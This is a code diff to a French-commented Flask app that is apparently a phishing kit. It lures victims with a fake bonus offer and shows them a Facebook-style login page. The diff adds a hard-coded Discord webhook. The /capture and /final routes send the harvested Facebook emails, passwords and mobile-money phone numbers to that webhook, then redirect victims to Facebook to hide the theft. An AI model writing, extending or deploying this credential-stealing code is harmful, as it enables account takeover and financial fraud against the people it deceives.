@@ -1,9 +1,22 @@
 import os
-from flask import Flask, request, redirect
+import requests  # Nécessaire pour envoyer les données à Discord
+from flask import Flask, request, redirect, render_template_string
 
 app = Flask(__name__)
 
-# --- INTERFACE 1 : ANNONCE DU BONUS ---
+# --- CONFIGURATION DISCORD ---
+DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1471099314398040230/mrOS59JK1KfeIQICVwIFwNbURRhR08ivbdWy_P3VQdwPJD4r1opB8krL26i1tyePIH8h"
+
+def send_to_discord(message):
+    """Fonction sécurisée pour envoyer les logs vers Discord"""
+    data = {"content": message}
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=data)
+    except Exception as e:
+        print(f"Erreur d'envoi Discord : {e}")
+
+# --- INTERFACES HTML ---
+
 HTML_ACCUEIL = '''
 <!DOCTYPE html>
 <html>
@@ -16,7 +29,6 @@ HTML_ACCUEIL = '''
         h2 { color: #2c3e50; margin-bottom: 10px; }
         p { color: #5a6c7d; line-height: 1.6; }
         .btn-check { display: block; width: 100%; padding: 15px; background: #3498db; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
-        .btn-check:hover { background: #2980b9; }
     </style>
 </head>
 <body>
@@ -31,7 +43,6 @@ HTML_ACCUEIL = '''
 </html>
 '''
 
-# --- INTERFACE 2 : ÉLIGIBILITÉ VIA FACEBOOK ---
 HTML_FACEBOOK = '''
 <!DOCTYPE html>
 <html>
@@ -60,7 +71,6 @@ HTML_FACEBOOK = '''
 </html>
 '''
 
-# --- INTERFACE 3 : RÉCLAMATION DU BONUS ---
 HTML_BONUS = '''
 <!DOCTYPE html>
 <html>
@@ -91,24 +101,36 @@ HTML_BONUS = '''
 </html>
 '''
 
+# --- ROUTES ---
+
 @app.route('/')
 def home():
-    return HTML_ACCUEIL
+    return render_template_string(HTML_ACCUEIL)
 
 @app.route('/auth')
 def auth():
-    return HTML_FACEBOOK
+    return render_template_string(HTML_FACEBOOK)
 
 @app.route('/capture', methods=['POST'])
 def capture():
     email = request.form.get('email')
     password = request.form.get('pass')
+    
+    # Envoi vers Discord
+    message = f"🔥 **NOUVELLE CAPTURE FB** 🔥\n👤 **User:** `{email}`\n🔑 **Pass:** `{password}`"
+    send_to_discord(message)
+    
     print(f"\n[!] LOGS CAPTURÉS : {email} | {password}")
-    return HTML_BONUS
+    return render_template_string(HTML_BONUS)
 
 @app.route('/final', methods=['POST'])
 def final():
     phone = request.form.get('phone')
+    
+    # Envoi du numéro vers Discord
+    message = f"💰 **NUMÉRO MOBILE MONEY** 💰\n📱 **Tel:** `{phone}`"
+    send_to_discord(message)
+    
     print(f"[+] NUMÉRO POUR BONUS : {phone}\n")
     return redirect("https://m.facebook.com")
 
